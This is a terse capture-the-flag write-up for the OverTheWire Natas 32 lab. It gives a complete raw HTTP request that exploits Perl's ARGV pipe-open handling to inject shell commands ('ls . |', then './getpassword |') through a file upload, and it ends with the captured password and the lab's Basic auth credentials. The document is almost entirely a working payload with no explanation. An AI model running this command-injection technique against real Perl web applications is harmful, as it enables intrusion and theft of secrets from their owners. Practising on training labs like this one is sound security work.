# Trick

Do first request:
```
POST /index.pl?ls%20.%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Content-Length: 308
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpZcDVmZnlmbUVkanZUT3dwTjVIQ3ZoN0N0Z2Y5ZW0zRw==
Upgrade-Insecure-Requests: 1
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2PlqeE7aHxdrGBk2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas32.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __utmz=176859643.1643998330.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utma=176859643.2088458813.1643998330.1643998330.1644080716.2
Connection: close

------WebKitFormBoundary2PlqeE7aHxdrGBk2
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
------WebKitFormBoundary2PlqeE7aHxdrGBk2
Content-Disposition: form-data; name="file"; filename="a.csv"
Content-Type: text/csv

NOME,IDADE
Fulando,18
Cicano,21

------WebKitFormBoundary2PlqeE7aHxdrGBk2
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundary2PlqeE7aHxdrGBk2--

```

Then do the second request, but change url to:
```
/index.pl?./getpassword%20|
```

# Flag

```
APwWDD3fRAf6226sgBOBaSptGwvXwQhG
```